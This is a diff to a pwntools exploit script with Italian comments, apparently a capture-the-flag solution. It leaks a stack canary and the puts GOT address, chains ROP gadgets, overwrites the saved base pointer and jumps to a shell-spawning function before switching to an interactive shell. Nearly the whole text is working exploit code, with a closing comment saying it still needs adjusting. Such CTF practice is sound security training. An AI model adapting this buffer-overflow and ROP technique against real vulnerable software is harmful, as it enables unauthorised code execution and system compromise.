@@ -58,7 +58,7 @@ print('canary: ' + canary.hex())
 
 
 PUTS_PLT = el.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
-MAIN_PLT = el.symbols['welcome'] + 0x9d
+MAIN_PLT = el.symbols['welcome'] # el.symbols['welcome'] + 0x9d per jumpare direttamente alla seconda puts
 POP_RDI = 0x00000000004012fb
 RET = 0x0000000000401016
 POP_RBP = 0x0000000000401149
@@ -67,15 +67,15 @@ reference_func = 'puts'
 FUNC_GOT = el.got[reference_func]
 
 
-rop_str = b'A'*8 + p64(POP_RBP) + old_bp + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
+rop_str = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
 # get address of puts
 old_bp = u64(old_bp)
 my_buff_addr = old_bp - 12 * 8
 overwrite_bp = p64(my_buff_addr)
 
-
+print(f'{len(rop_str)=}')
 payload = flat({
-    0: rop_str,
+    8: rop_str,
     offset: canary,
     offset + 8: overwrite_bp,
 })
@@ -103,15 +103,22 @@ print(f'shell spawner address: {hex(shell)}')
 shell = p64(shell)
 
 # siamo di nuovo in welcome, forse al secondo read
-#p.sendline(b'ciao')
+p.recvuntil(b'> ')
+p.sendline(b'ciao')
+print(p.recvuntil(b'> '))
+
+
+print(overwrite_bp.hex())
 payload = flat({
+    8: shell,
     offset: canary,
-    offset + 16: shell
+    offset + 8: overwrite_bp,
 })
 p.sendline(payload)
+p.recvline()
 
-p.sendline(b'cat flag.txt')
-if b'flag{' in  p.recvline():
-    print('funziono!!!')
+#p.sendline(b'cat flag.txt')
+#if b'flag{' in  p.recvline():
+#    print('funziono!!!')
 p.interactive()
 # e qui dovrebbe funzionare, vanno solo aggiustate un po' di cose
